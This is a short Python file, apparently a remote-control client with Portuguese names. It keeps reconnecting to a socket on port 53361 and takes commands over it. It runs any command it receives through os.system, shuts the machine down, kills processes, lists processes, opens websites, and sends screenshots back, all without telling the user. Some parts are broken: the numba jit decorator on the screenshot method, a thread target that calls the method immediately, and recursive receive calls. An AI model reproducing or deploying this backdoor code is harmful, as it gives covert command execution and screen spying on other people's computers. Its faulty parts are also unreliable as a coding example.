import socket as ss
from threading import Thread
import os
from pyautogui import alert, screenshot
import psutil as ps
import webbrowser
import io
from numba import jit


class Idd:
    def __init__(self):
        while True:
            try:
                with ss.socket(ss.AF_INET, ss.SOCK_STREAM) as self.idle:
                    self.idle.connect((ss.gethostname(), 53361))
                    self.receber()
            except ss.error:
                self.idle.close()
                continue

            except Exception:
                continue

    def receber(self):
        while True:
            while True:
                path = self.idle.recv(1024)
                if path:
                    path = path.decode("utf-8")
                    break

            if "\n" in path:
                pato = path.split("\n")

                if "kill" in pato:
                    self.fechar(pato[1])
                    continue

                if "popup" in pato:
                    Thread(target=self.process_pop, args=(pato[1],)).start()
                    continue

                if "expecifico" in pato:
                    Thread(target=self.expec, args=(pato[1],)).start()
                    continue

                if "site" in pato:
                    Thread(target=self.site, args=(pato[1],)).start()
                    continue

            else:
                if path == "S_D":
                    self.desligar()
                    continue

                if path == "RP":
                    self.process_list()
                    continue

                if path == "PrintS":
                    Thread(target=self.system_photo()).start()

    def site(self, sitee):
        webbrowser.open(sitee)
        self.idle.send(bytes("Site aberto", "utf-8"))
        self.receber()

    def expec(self, comand):
        os.system(comand)
        self.idle.send(bytes(f"{comand} est√° sendo executado", "utf-8"))
        self.receber()

    def desligar(self):
        os.system("shutdown -s -t 0")
        self.idle.send(bytes("Desligando", "utf-8"))
        self.receber()

    def fechar(self, processo):
        os.system(f"TASKKILL /IM {processo}")
        self.idle.send(bytes(f"{processo} Fechado", "utf-8"))
        self.receber()

    # -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= #
    @staticmethod
    def process_pop(pip):
        alert(pip)

    # -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= #
    def process_list(self):
        processos = list()
        for proc in ps.process_iter():
            if not proc.name() in processos:
                processos.append(proc.name())
        self.idle.send(bytes(f"{processos}", "utf-8"))
        self.receber()

    # -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= #
    @jit(nopython=True)
    def system_photo(self):
        foto = screenshot()
        img_byte_array = io.BytesIO()
        foto.save(img_byte_array, format=foto.format)
        self.idle.send(img_byte_array.getvalue())


Idd()
